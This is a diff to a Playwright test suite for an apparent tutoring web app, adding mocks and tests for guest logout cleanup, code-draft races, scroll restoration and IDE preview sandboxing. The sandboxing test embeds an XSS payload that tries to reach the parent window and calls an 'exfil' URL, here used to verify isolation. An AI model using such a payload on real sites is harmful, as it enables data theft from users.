@@ -59,7 +59,17 @@ const MOCK_DSA_PROBLEMS = [
   },
 ];
 
-async function installMockApi(page, { user = MOCK_USER, trackers = null } = {}) {
+const MOCK_GUEST = {
+  id: 777,
+  name: 'Guest Explorer',
+  email: 'guest-777@guest.novatutor.local',
+  role: 'GUEST',
+  profileComplete: true,
+  token: 'mock-jwt-token-guest',
+  learningGoal: 'Explore NovaTutor',
+};
+
+async function installMockApi(page, { user = MOCK_USER, trackers = null, dsaProgress = null, starterDelayMs = 0 } = {}) {
   const counts = trackers || { authMe: 0, intelligence: 0, hardQuiz: 0 };
 
   await page.route('**/api/**', async (route) => {
@@ -78,6 +88,9 @@ async function installMockApi(page, { user = MOCK_USER, trackers = null } = {}) 
     if (p === '/auth/me') {
       counts.authMe += 1;
       return json(user);
+    }
+    if (p === '/auth/guest' && method === 'DELETE') {
+      return json({ ok: true });
     }
     if (p === '/ai/status') return json({ configured: true, model: 'gemini-2.5-flash' });
     if (p === '/courses' && method === 'GET') return json(MOCK_COURSES);
@@ -123,7 +136,7 @@ async function installMockApi(page, { user = MOCK_USER, trackers = null } = {}) 
       return json({ total: 2, easy: 2, medium: 0, hard: 0 });
     }
     if (p === '/dsa/progress') {
-      return json({ problems: [{ slug: 'valid-parentheses', status: 'SOLVED', bookmarked: false }] });
+      return json(dsaProgress || { problems: [{ slug: 'valid-parentheses', status: 'SOLVED', bookmarked: false }] });
     }
     if (p === '/dsa/progress/summary') {
       return json({ solved: 1, total: 2 });
@@ -135,16 +148,24 @@ async function installMockApi(page, { user = MOCK_USER, trackers = null } = {}) 
         title: 'Two Sum',
         difficulty: 'Easy',
         topic: 'Arrays',
+        signature: 'twoSum(nums, target)',
+        tags: ['HashMap', 'Array'],
+        cSupported: true,
         statement: 'Return indices of two numbers that add up to target.',
-        examples: [{ input: 'nums=[2,7,11,15], target=9', output: '[0,1]' }],
-        constraints: ['2 <= nums.length <= 10^4'],
-        starters: { python: 'def twoSum(nums, target):\n    return [0, 1]\n', javascript: 'function twoSum(nums, target) { return [0, 1]; }' },
-        visibleTests: [{ input: '[2,7,11,15]\n9', expected: '[0,1]' }],
+        constraints: '2 <= nums.length <= 10^4',
+        samples: [{ input: '2,7,11,15\n9', expected: '0,1' }],
         hiddenTestCount: 4,
       });
     }
     if (p === '/dsa/problems/two-sum/starter') {
-      return json({ language: url.searchParams.get('language') || 'java', code: 'class Solution { public int[] twoSum(int[] a, int t) { return new int[]{0,1}; } }' });
+      const reqLang = url.searchParams.get('language') || 'java';
+      if (starterDelayMs > 0) {
+        await new Promise((r) => setTimeout(r, starterDelayMs));
+      }
+      const code = reqLang === 'python'
+        ? 'def twoSum(nums, target):\n    return [0, 1]\n'
+        : 'class Solution { public int[] twoSum(int[] a, int t) { return new int[]{0,1}; } }';
+      return json({ language: reqLang, code });
     }
     if (p === '/knowledge' && method === 'GET') {
       return json([{ id: 9, fileName: 'OS_Notes.pdf', sizeBytes: 120000, uploadedAt: new Date().toISOString() }]);
@@ -163,20 +184,18 @@ async function installMockApi(page, { user = MOCK_USER, trackers = null } = {}) 
       return json({ answer: '## Exam Summary\n\n- Virtual memory enables process isolation.' });
     }
     if (p === '/gate-cse/notes') return json([]);
-    if (p === '/health') return json({ status: 'UP', database: 'UP' });
+    if (p === '/health') return json({ status: 'UP', app: 'NovaTutor', database: 'UP' });
     if (p === '/admin/dashboard' || p === '/admin/overview') {
       return json({
-        totalUsers: 2,
-        totalStudents: 1,
-        totalAdmins: 1,
-        totalGuests: 0,
-        totalCourses: 6,
-        totalLessons: 24,
-        totalQuestions: 50,
-        totalDocuments: 1,
-        totalPosts: 0,
-        totalEvents: 12,
-        totalQuizAttempts: 3,
+        users: 2,
+        activeUsers: 2,
+        blockedUsers: 0,
+        courses: 6,
+        publishedCourses: 6,
+        lessons: 24,
+        questions: 50,
+        attempts: 3,
+        auditEvents: 4,
       });
     }
     if (p === '/admin/courses') return json(MOCK_COURSES);
@@ -188,8 +207,23 @@ async function installMockApi(page, { user = MOCK_USER, trackers = null } = {}) 
     if (p === '/admin/gate-notes') return json([]);
     if (p === '/admin/knowledge') return json([]);
     if (p === '/admin/community/posts' || p === '/admin/community') return json([]);
-    if (p === '/admin/ai/usage') return json({ totalCalls: 5, byTask: {}, byModel: {} });
-    if (p === '/admin/sandbox/usage') return json({ totalRuns: 0, active: 0 });
+    if (p === '/admin/ai/usage') {
+      return json({
+        totalRequests: 5,
+        failureRate: 0,
+        tasks: [{ task: 'CHAT', requests: 5, medianMs: 120, averageMs: 140, maxMs: 250, firstTokenAvgMs: 80, failureRate: 0 }],
+      });
+    }
+    if (p === '/admin/sandbox/usage') {
+      return json({
+        provider: 'docker-local',
+        submissions: 2,
+        lastLatencyMs: 95,
+        activePermitsFree: 4,
+        concurrency: 4,
+        verdicts: { PASSED: 2 },
+      });
+    }
     if (p === '/ai/ask' && method === 'POST') return json({ answer: '## Mock Explanation\n\nHere is a clear explanation.\n\n**Mini Question:** What is the base case?' });
     if (p === '/ai/ask/stream' && method === 'POST') {
       return route.fulfill({
@@ -211,6 +245,7 @@ async function installMockApi(page, { user = MOCK_USER, trackers = null } = {}) 
 
 async function seedSignedIn(page, user = MOCK_USER, extraStorage = {}) {
   await page.addInitScript(({ u, extra }) => {
+    if (window.self !== window.top) return;
     localStorage.setItem('ai_user', JSON.stringify(u));
     localStorage.setItem('nova_page', 'dashboard');
     sessionStorage.setItem('nova_app_session_marker', '1');
@@ -379,7 +414,7 @@ test.describe('NovaTutor Stabilization Verification (Pass 1, Pass 2, Pass 3)', (
     await expect(page.locator('.error.settings-error')).toHaveCount(0);
   });
 
-  test('Pass 2A (Security): Course IDE HTML preview iframe executes in opaque origin and blocks parent access', async ({ page }) => {
+  test('Pass 2A (Security): Course IDE HTML preview renders via isolated /ide-preview.html, blocks parent access & outbound network', async ({ page }) => {
     await page.setViewportSize({ width: 1280, height: 900 });
     await installMockApi(page);
     await seedSignedIn(page);
@@ -388,7 +423,7 @@ test.describe('NovaTutor Stabilization Verification (Pass 1, Pass 2, Pass 3)', (
     const langSelect = page.locator('select[aria-label="Language"]');
     await langSelect.selectOption('HTML');
 
-    const payload = `<!doctype html><html><body><p id="out">init</p><script>
+    const payload = `<!doctype html><html><body><p id="out">init</p><p id="net">pending</p><script>
       try {
         window.parent.localStorage.setItem('xss_pwned', '1');
         window.parent.document.title = 'XSS_PWNED';
@@ -396,6 +431,10 @@ test.describe('NovaTutor Stabilization Verification (Pass 1, Pass 2, Pass 3)', (
       } catch (e) {
         document.getElementById('out').textContent = 'ISOLATED:' + e.name;
       }
+      fetch('https://example.com/exfil').then(
+        () => { document.getElementById('net').textContent = 'NET_ALLOWED'; },
+        () => { document.getElementById('net').textContent = 'NET_BLOCKED'; }
+      );
     </script></body></html>`;
 
     await page.locator('textarea[aria-label="Code editor"]').fill(payload);
@@ -403,12 +442,15 @@ test.describe('NovaTutor Stabilization Verification (Pass 1, Pass 2, Pass 3)', (
 
     const iframe = page.locator('iframe.html-preview');
     await expect(iframe).toBeVisible();
+    await expect(iframe).toHaveAttribute('src', '/ide-preview.html');
+    expect(await iframe.getAttribute('srcdoc')).toBeNull();
     await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts');
     await expect(iframe).toHaveAttribute('referrerpolicy', 'no-referrer');
     await expect(iframe).toHaveAttribute('allow', '');
 
-    // Verify the script actually executed AND was blocked by opaque origin (SecurityError)
+    // Verify the script actually executed, parent access failed (SecurityError), AND outbound fetch was blocked by inner CSP
     await expect(iframe.contentFrame().locator('#out')).toHaveText(/ISOLATED:SecurityError/);
+    await expect(iframe.contentFrame().locator('#net')).toHaveText('NET_BLOCKED');
 
     const pwned = await page.evaluate(() => localStorage.getItem('xss_pwned'));
     const title = await page.title();
@@ -439,24 +481,33 @@ test.describe('NovaTutor Stabilization Verification (Pass 1, Pass 2, Pass 3)', (
     expect(colors.fg).not.toBe('rgb(255, 255, 255)');
   });
 
-  test('Pass 2C (Isolation): Logout clears user localStorage, scroll sessionStorage, and preserves theme', async ({ page }) => {
+  test('Pass 2C (Isolation): Guest & student logout from active module purges ALL scoped/unscoped state and preserves theme', async ({ page }) => {
     await page.setViewportSize({ width: 1280, height: 900 });
-    await installMockApi(page, { user: MOCK_USER });
-    await seedSignedIn(page, MOCK_USER, {
+    await installMockApi(page, { user: MOCK_GUEST });
+    await seedSignedIn(page, MOCK_GUEST, {
       nova_theme: 'dark',
-      nova_career_goal: 'Staff Engineer',
+      nova_career_goal: 'Guest Secret Goal',
       nova_teaching_mode: 'Socratic',
       nova_learning_studio_tab: 'voice',
       daily_goal: '90',
+      nova_workspace_v1_777_studio: JSON.stringify({ note: 'guest secret workspace' }),
+      nova_module_state_777_studio: JSON.stringify({ draft: 'guest secret module' }),
+      nova_quiz_seen_777_1: JSON.stringify([101, 102]),
+      nova_today_done_777_2026_11_18: '1',
+      nova_challenge_seen_777_2026_11_18: '1',
+      dsa_code_777_two_sum_python: '# guest secret solution',
     });
 
-    await page.goto('/#/dashboard');
-    await expect(page.locator('.dash-morning')).toBeVisible();
-    await page.evaluate(() => sessionStorage.setItem('nova_scroll_v2:dashboard', '420'));
+    // Mount an active module that uses useModulePersistence so unmount-flush race is exercised
+    await page.goto('/#/learning-studio');
+    await expect(page.getByRole('tab', { name: /AI Teacher/i })).toBeVisible();
+    await page.evaluate(() => sessionStorage.setItem('nova_scroll_v2:learning-studio', '420'));
 
     await page.getByRole('button', { name: 'Account menu' }).click();
     await page.getByRole('menuitem', { name: 'Log out' }).click();
     await expect(page).toHaveURL(/#\/login/);
+    // Wait past useModulePersistence debounce/unmount window to ensure nothing is resurrected
+    await page.waitForTimeout(450);
 
     const residual = await page.evaluate(() => ({
       aiUser: localStorage.getItem('ai_user'),
@@ -466,6 +517,14 @@ test.describe('NovaTutor Stabilization Verification (Pass 1, Pass 2, Pass 3)', (
       dailyGoal: localStorage.getItem('daily_goal'),
       coursesCache: localStorage.getItem('nova_courses_cache'),
       theme: localStorage.getItem('nova_theme'),
+      leakedGuestKeys: Object.keys(localStorage).filter((k) =>
+        k.startsWith('nova_workspace_v1_777') ||
+        k.startsWith('nova_module_state_777') ||
+        k.startsWith('nova_quiz_seen_777') ||
+        k.startsWith('nova_today_done_777') ||
+        k.startsWith('nova_challenge_seen_777') ||
+        k.startsWith('dsa_code_777')
+      ),
       scrollKeys: Object.keys(sessionStorage).filter((k) => k.startsWith('nova_scroll_v2:')),
     }));
 
@@ -475,6 +534,7 @@ test.describe('NovaTutor Stabilization Verification (Pass 1, Pass 2, Pass 3)', (
     expect(residual.studioTab).toBeNull();
     expect(residual.dailyGoal).toBeNull();
     expect(residual.coursesCache).toBeNull();
+    expect(residual.leakedGuestKeys).toEqual([]);
     expect(residual.scrollKeys).toEqual([]);
     expect(residual.theme).toBe('dark');
   });
@@ -493,6 +553,76 @@ test.describe('NovaTutor Stabilization Verification (Pass 1, Pass 2, Pass 3)', (
     await page.getByRole('button', { name: /Learn with AI Teacher/i }).click();
     await expect(page).toHaveURL(/#\/learning-studio$/);
     await expect(page.getByRole('tab', { name: /AI Teacher/i })).toHaveAttribute('aria-selected', 'true');
+  });
+
+  test('Pass 2E (DSA Direct-Link): Slow starter cannot overwrite server lastCode, and local draft wins while preserving language', async ({ page }) => {
+    await page.setViewportSize({ width: 1280, height: 900 });
+
+    // Scenario 1: Slow default Java starter (450ms) vs fast /dsa/progress returning saved Python code + bookmark
+    await installMockApi(page, {
+      user: MOCK_USER,
+      starterDelayMs: 450,
+      dsaProgress: {
+        problems: [{
+          slug: 'two-sum',
+          status: 'ATTEMPTED',
+          bookmarked: true,
+          lastLanguage: 'python',
+          lastCode: '# SERVER SAVED PYTHON\ndef twoSum(nums, target):\n    return [0, 1]\n',
+        }],
+      },
+    });
+    await seedSignedIn(page, MOCK_USER);
+
+    await page.goto('/#/dsa/two-sum');
+    const langSel = page.locator('select[aria-label="Language"]');
+    const editor = page.locator('.dsa-editor textarea');
+    await expect(langSel).toHaveValue('python');
+    await expect(editor).toHaveValue(/# SERVER SAVED PYTHON/);
+    await expect(page.getByRole('button', { name: /Remove bookmark/i })).toHaveAttribute('aria-pressed', 'true');
+
+    // Wait well past the 450ms slow Java starter response to prove it does NOT overwrite Python code
+    await page.waitForTimeout(700);
+    await expect(langSel).toHaveValue('python');
+    await expect(editor).toHaveValue(/# SERVER SAVED PYTHON/);
+
+    // Scenario 2: Local draft for saved language exists -> MUST restore saved language AND keep local draft over server lastCode
+    await page.evaluate(() => {
+      localStorage.setItem('dsa_code_42_two-sum_python', '# LOCAL PYTHON DRAFT\ndef twoSum(nums, target):\n    return [1, 2]\n');
+    });
+    await page.reload();
+    await expect(langSel).toHaveValue('python');
+    await expect(editor).toHaveValue(/# LOCAL PYTHON DRAFT/);
+    await page.waitForTimeout(600);
+    await expect(editor).toHaveValue(/# LOCAL PYTHON DRAFT/);
+  });
+
+  test('Pass 2F (Navigation): Invalid hashchange on Dashboard does not lock subsequent Back scroll restoration', async ({ page }) => {
+    await page.setViewportSize({ width: 1280, height: 800 });
+    await installMockApi(page);
+    await seedSignedIn(page);
+
+    await page.goto('/#/dashboard');
+    const firstCard = page.locator('.course-card').first();
+    await expect(firstCard).toBeVisible();
+
+    // Trigger hashchange to an invalid hash while already on Dashboard (the exact HIGH-FE-05 trigger
+    // that previously set restoringScrollRef.current = true without re-running useEffect([routeKey])).
+    await page.evaluate(() => { window.location.hash = '#/nonexistent-route-xyz'; });
+    await page.waitForTimeout(150);
+
+    await firstCard.scrollIntoViewIfNeeded();
+    await page.waitForTimeout(150);
+    await firstCard.click();
+    await expect(page).toHaveURL(/#\/course\/1$/);
+    const savedScroll = await page.evaluate(() => Number(sessionStorage.getItem('nova_scroll_v2:dashboard') || 0));
+    expect(savedScroll).toBeGreaterThanOrEqual(120);
+
+    await page.goBack();
+    await page.waitForTimeout(450);
+    await expect(firstCard).toBeVisible();
+    const restoredScroll = await page.evaluate(() => window.scrollY);
+    expect(Math.abs(restoredScroll - savedScroll)).toBeLessThanOrEqual(15);
   });
 
   test('Pass 3: 12-Viewport Dashboard Audit, multi-page desktop+mobile overflow, Escape mobile sheet & theme contrast', async ({ page }) => {
